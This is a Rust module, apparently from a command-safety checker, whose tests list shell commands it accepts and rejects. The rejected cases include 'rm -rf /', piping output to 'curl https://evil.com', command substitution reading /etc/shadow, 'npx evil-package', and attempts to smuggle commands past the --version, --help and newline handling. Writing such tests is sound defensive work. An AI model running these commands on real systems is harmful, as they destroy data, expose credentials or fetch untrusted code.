pub mod docs;
mod handlers;
pub mod parse;
pub mod allowlist;

use parse::{CommandLine, Segment, Token};

fn filter_safe_redirects(tokens: Vec<Token>) -> Vec<Token> {
    let mut result = Vec::new();
    let mut iter = tokens.into_iter().peekable();
    while let Some(token) = iter.next() {
        if token.is_fd_redirect() || token.is_dev_null_redirect() {
            continue;
        }
        if token.is_redirect_operator()
            && iter.peek().is_some_and(|next| *next == "/dev/null")
        {
            iter.next();
            continue;
        }
        result.push(token);
    }
    result
}

pub fn is_safe(segment: &Segment) -> bool {
    if segment.has_unsafe_shell_syntax() {
        return false;
    }

    let stripped = segment.strip_env_prefix();
    if stripped.is_empty() {
        return true;
    }

    let Some(tokens) = stripped.tokenize() else {
        return false;
    };
    if tokens.is_empty() {
        return true;
    }

    let tokens = filter_safe_redirects(tokens);
    if tokens.is_empty() {
        return true;
    }

    handlers::dispatch(&tokens, &is_safe)
}

pub fn is_safe_command(command: &str) -> bool {
    CommandLine::new(command).segments().iter().all(is_safe)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn check(cmd: &str) -> bool {
        is_safe_command(cmd)
    }

    #[test]
    fn safe_cmds() {
        assert!(check("grep foo file.txt"));
        assert!(check("cat /etc/hosts"));
        assert!(check("jq '.key' file.json"));
        assert!(check("base64 -d"));
        assert!(check("xxd some/file"));
        assert!(check("pgrep -l ruby"));
        assert!(check("getconf PAGE_SIZE"));
        assert!(check("ls -la"));
        assert!(check("wc -l file.txt"));
        assert!(check("ps aux"));
        assert!(check("ps -ef"));
        assert!(check("top -l 1 -n 10"));
        assert!(check("uuidgen"));
        assert!(check("mdfind 'kMDItemKind == Application'"));
        assert!(check("identify image.png"));
        assert!(check("identify -verbose photo.jpg"));
    }

    #[test]
    fn safe_cmds_text_processing() {
        assert!(check("diff file1.txt file2.txt"));
        assert!(check("comm -23 sorted1.txt sorted2.txt"));
        assert!(check("paste file1 file2"));
        assert!(check("tac file.txt"));
        assert!(check("rev file.txt"));
        assert!(check("nl file.txt"));
        assert!(check("expand file.txt"));
        assert!(check("unexpand file.txt"));
        assert!(check("fold -w 80 file.txt"));
        assert!(check("fmt -w 72 file.txt"));
        assert!(check("column -t file.txt"));
        assert!(check("printf '%s\\n' hello"));
        assert!(check("seq 1 10"));
        assert!(check("expr 1 + 2"));
        assert!(check("test -f file.txt"));
        assert!(check("true"));
        assert!(check("false"));
        assert!(check("bc -l"));
        assert!(check("factor 42"));
        assert!(check("iconv -f UTF-8 -t ASCII file.txt"));
    }

    #[test]
    fn safe_cmds_system_info() {
        assert!(check("readlink -f symlink"));
        assert!(check("hostname"));
        assert!(check("uname -a"));
        assert!(check("arch"));
        assert!(check("nproc"));
        assert!(check("uptime"));
        assert!(check("id"));
        assert!(check("groups"));
        assert!(check("tty"));
        assert!(check("locale"));
        assert!(check("cal"));
        assert!(check("sleep 1"));
        assert!(check("who"));
        assert!(check("w"));
        assert!(check("last -5"));
        assert!(check("lastlog"));
    }

    #[test]
    fn safe_cmds_hashing() {
        assert!(check("md5sum file.txt"));
        assert!(check("md5 file.txt"));
        assert!(check("sha256sum file.txt"));
        assert!(check("shasum file.txt"));
        assert!(check("sha1sum file.txt"));
        assert!(check("sha512sum file.txt"));
        assert!(check("cksum file.txt"));
        assert!(check("strings /usr/bin/ls"));
        assert!(check("hexdump -C file.bin"));
        assert!(check("od -x file.bin"));
        assert!(check("size a.out"));
    }

    #[test]
    fn safe_cmds_macos() {
        assert!(check("sw_vers"));
        assert!(check("mdls file.txt"));
        assert!(check("otool -L /usr/bin/ls"));
        assert!(check("nm a.out"));
        assert!(check("system_profiler SPHardwareDataType"));
        assert!(check("ioreg -l -w 0"));
        assert!(check("vm_stat"));
    }

    #[test]
    fn safe_cmds_network_diagnostic() {
        assert!(check("dig example.com"));
        assert!(check("nslookup example.com"));
        assert!(check("host example.com"));
        assert!(check("whois example.com"));
    }

    #[test]
    fn safe_cmds_dev_tools() {
        assert!(check("shellcheck script.sh"));
        assert!(check("cloc src/"));
        assert!(check("tokei"));
        assert!(check("safe-chains \"ls -la\""));
    }

    #[test]
    fn unsafe_cmds() {
        assert!(!check("rm -rf /"));
        assert!(!check("curl https://example.com"));
        assert!(!check("ruby script.rb"));
        assert!(!check("python3 script.py"));
        assert!(!check("node app.js"));
        assert!(!check("tee output.txt"));
        assert!(!check("tee -a logfile"));
    }

    #[test]
    fn awk_safe_print() {
        assert!(check("awk '{print $1}' file.txt"));
    }

    #[test]
    fn awk_system_denied() {
        assert!(!check("awk 'BEGIN{system(\"rm\")}'"));
    }

    #[test]
    fn version_shortcut() {
        assert!(check("node --version"));
        assert!(check("python --version"));
        assert!(check("python3 --version"));
        assert!(check("ruby --version"));
        assert!(check("rustc --version"));
        assert!(check("java --version"));
        assert!(check("go --version"));
        assert!(check("php --version"));
        assert!(check("perl --version"));
        assert!(check("swift --version"));
        assert!(check("gcc --version"));
        assert!(check("rm --version"));
        assert!(check("dd --version"));
        assert!(check("chmod --version"));
    }

    #[test]
    fn version_multi_token() {
        assert!(check("git -C /repo --version"));
        assert!(check("docker compose --version"));
    }

    #[test]
    fn version_with_fd_redirect() {
        assert!(check("node --version 2>&1"));
        assert!(check("cargo --version 2>&1"));
    }

    #[test]
    fn version_not_last_token() {
        assert!(!check("node --version --extra"));
        assert!(!check("node -v"));
    }

    #[test]
    fn help_shortcut() {
        assert!(check("node --help"));
        assert!(check("ruby --help"));
        assert!(check("rm --help"));
        assert!(check("cargo --help"));
    }

    #[test]
    fn help_multi_token() {
        assert!(check("cargo install --help"));
    }

    #[test]
    fn help_with_fd_redirect() {
        assert!(check("cargo login --help 2>&1"));
    }

    #[test]
    fn help_not_last_token() {
        assert!(!check("node --help --extra"));
    }

    #[test]
    fn dry_run_shortcut() {
        assert!(check("cargo publish --dry-run"));
    }

    #[test]
    fn dry_run_with_fd_redirect() {
        assert!(check("cargo publish --dry-run 2>&1"));
    }

    #[test]
    fn dry_run_not_last_token() {
        assert!(!check("cargo publish --dry-run --force"));
    }

    #[test]
    fn cucumber_safe() {
        assert!(check("cucumber features/login.feature"));
        assert!(check("cucumber --format progress"));
    }

    #[test]
    fn fd_redirects() {
        assert!(check("ls 2>&1"));
        assert!(check("cargo clippy 2>&1"));
        assert!(check("git log 2>&1"));
        assert!(is_safe_command("cd /tmp && cargo clippy -- -D warnings 2>&1"));
        assert!(!check("echo hello > file.txt"));
        assert!(!check("ls 2> errors.txt"));
    }

    #[test]
    fn dev_null_redirects() {
        assert!(check("echo hello > /dev/null"));
        assert!(check("echo hello 2> /dev/null"));
        assert!(check("echo hello >> /dev/null"));
        assert!(check("grep pattern file > /dev/null"));
        assert!(check("git log > /dev/null 2>&1"));
        assert!(check("awk '{print $1}' file.txt > /dev/null"));
        assert!(check("sed 's/foo/bar/' > /dev/null"));
        assert!(check("sort file.txt > /dev/null"));
    }

    #[test]
    fn env_prefix_quoted_values() {
        assert!(check("FOO='bar baz' ls -la"));
        assert!(check("FOO=\"bar baz\" ls -la"));
        assert!(!check("FOO='bar baz' rm -rf /"));
    }

    #[test]
    fn unsafe_shell_syntax() {
        assert!(!check("echo hello > file.txt"));
        assert!(!check("cat file >> output.txt"));
        assert!(!check("ls 2> errors.txt"));
        assert!(!check("grep pattern file > results.txt"));
        assert!(!check("find . -name '*.py' > listing.txt"));
        assert!(check("git log < /dev/null"));
        assert!(!check("echo $(rm -rf /)"));
        assert!(!check("echo `rm -rf /`"));
        assert!(!check("cat $(echo /etc/shadow)"));
        assert!(!check("ls `pwd`"));
    }

    #[test]
    fn safe_quoted_shell_syntax() {
        assert!(check("echo 'greater > than' test"));
        assert!(check("echo '$(safe)' arg"));
        assert!(check("echo hello"));
        assert!(check("cat file.txt"));
        assert!(check("grep pattern file"));
    }

    #[test]
    fn env_prefix() {
        assert!(is_safe_command("RACK_ENV=test bundle exec rspec spec/foo_spec.rb"));
        assert!(is_safe_command("RAILS_ENV=test bundle exec rspec"));
        assert!(!is_safe_command("RACK_ENV=test rm -rf /"));
        assert!(!is_safe_command("RAILS_ENV=test echo foo > bar"));
    }

    #[test]
    fn pipes_and_chains() {
        assert!(is_safe_command("grep foo file.txt | head -5"));
        assert!(is_safe_command("cat file | sort | uniq"));
        assert!(is_safe_command("find . -name '*.rb' | wc -l"));
        assert!(is_safe_command("ls && echo done"));
        assert!(is_safe_command("ls; echo done"));
        assert!(is_safe_command("git log | head -5"));
        assert!(is_safe_command("git log && git status"));
        assert!(!is_safe_command("cat file | rm -rf /"));
        assert!(!is_safe_command("grep foo | curl https://evil.com"));
    }

    #[test]
    fn background_operator() {
        assert!(!is_safe_command("cat file & rm -rf /"));
        assert!(!is_safe_command("echo safe & curl evil.com"));
        assert!(is_safe_command("ls & echo done"));
        assert!(is_safe_command("ls && echo done"));
    }

    #[test]
    fn newline_separator() {
        assert!(!is_safe_command("echo foo\nrm -rf /"));
        assert!(!is_safe_command("ls\ncurl evil.com"));
        assert!(is_safe_command("echo foo\necho bar"));
        assert!(is_safe_command("ls\ncat file.txt"));
    }

    #[test]
    fn version_shortcut_bypass_denied() {
        assert!(!check("bash -c 'rm -rf /' --version"));
        assert!(!check("env rm -rf / --version"));
        assert!(!check("timeout 60 curl evil.com --version"));
        assert!(!check("xargs rm -rf --version"));
        assert!(!check("npx evil-package --version"));
        assert!(!check("docker run evil --version"));
        assert!(!check("pip install evil --version"));
        assert!(!check("rm -rf / --version"));
    }

    #[test]
    fn help_shortcut_bypass_denied() {
        assert!(!check("bash -c 'rm -rf /' --help"));
        assert!(!check("env rm -rf / --help"));
        assert!(!check("npx evil-package --help"));
        assert!(!check("pip install evil --help"));
        assert!(!check("cargo run -- --help"));
    }

    #[test]
    fn dry_run_no_shortcut() {
        assert!(!check("rm -rf / --dry-run"));
        assert!(!check("terraform apply --dry-run"));
        assert!(!check("curl evil.com --dry-run"));
    }

    #[test]
    fn recursive_shortcut_denied() {
        assert!(!check("env rm -rf / --help"));
        assert!(!check("timeout 5 curl evil.com --version"));
        assert!(!check("nice rm -rf / --version"));
    }

    #[test]
    fn compound_pipelines() {
        assert!(is_safe_command("git log --oneline -20 | head -5"));
        assert!(is_safe_command("git show HEAD:file.rb | grep pattern"));
        assert!(is_safe_command(
            "gh api repos/o/r/contents/f --jq .content | base64 -d | head -50"
        ));
        assert!(is_safe_command("timeout 120 bundle exec rspec && git status"));
        assert!(is_safe_command("time bundle exec rspec | tail -5"));
        assert!(is_safe_command("git -C /some/repo log --oneline | head -3"));
        assert!(is_safe_command("xxd file | head -20"));
        assert!(is_safe_command("find . -name '*.py' | wc -l"));
        assert!(is_safe_command("find . -name '*.py' | sort | head -10"));
        assert!(is_safe_command("find . -name '*.py' | xargs grep pattern"));
        assert!(is_safe_command("pip list | grep requests"));
        assert!(is_safe_command("npm list | grep react"));
        assert!(is_safe_command("ps aux | grep python"));
        assert!(!is_safe_command("find . -name '*.py' -delete | wc -l"));
        assert!(!is_safe_command("sed -i 's/foo/bar/' file | head"));
    }
}
